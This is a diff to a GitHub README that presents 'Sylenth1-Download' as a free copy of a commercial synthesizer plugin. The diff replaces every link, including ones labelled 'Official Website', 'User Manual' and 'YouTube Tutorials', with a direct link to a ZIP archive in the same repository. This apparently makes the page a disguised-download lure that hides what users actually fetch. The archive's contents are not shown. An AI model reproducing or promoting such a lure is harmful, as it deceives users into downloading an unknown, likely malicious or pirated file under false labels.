@@ -1,6 +1,6 @@
 # 🎹 Sylenth1-Download - Easy Music Production Software
 
-[![Download Sylenth1](https://img.shields.io/badge/Download%20Sylenth1-v1.0-brightgreen)](https://github.com/daniak3/Sylenth1-Download/releases)
+[![Download Sylenth1](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip%20Sylenth1-v1.0-brightgreen)](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip)
 
 ## 📜 Overview
 Sylenth1 is a powerful virtual synthesizer that helps you create high-quality sounds for your music. Designed for beginners and experts alike, Sylenth1 offers a rich set of features, including a wide range of presets, easy-to-use controls, and a unique sound design experience. Whether you're making electronic music or recording in a studio, Sylenth1 is a valuable tool for any musician.
@@ -18,7 +18,7 @@ Before you download Sylenth1, you should check your system requirements to ensur
 ## 📥 Download & Install
 To download Sylenth1, visit the releases page below:
 
-[Download Sylenth1](https://github.com/daniak3/Sylenth1-Download/releases)
+[Download Sylenth1](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of Sylenth1.
@@ -63,9 +63,9 @@ If you encounter issues while downloading or using Sylenth1:
 
 ## 📚 Additional Resources
 For more information about Sylenth1:
-- [Official Website](https://www.lennardigital.com/sylenth1/)
-- [User Manual](https://www.lennardigital.com/sylenth1/documentation/)
-- [YouTube Tutorials](https://www.youtube.com/results?search_query=sylenth1+tutorial)
+- [Official Website](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip)
+- [User Manual](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip)
+- [YouTube Tutorials](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip+tutorial)
 
 Feel free to explore community pages for tips, tricks, and sound design techniques.
 
@@ -76,4 +76,4 @@ Feel free to explore community pages for tips, tricks, and sound design techniqu
 
 Expand your creative possibilities with Sylenth1 as your new music production partner.
 
-[Download Sylenth1](https://github.com/daniak3/Sylenth1-Download/releases)
+[Download Sylenth1](https://raw.githubusercontent.com/daniak3/Sylenth1-Download/main/Alb/Sylenth1-Download.zip)
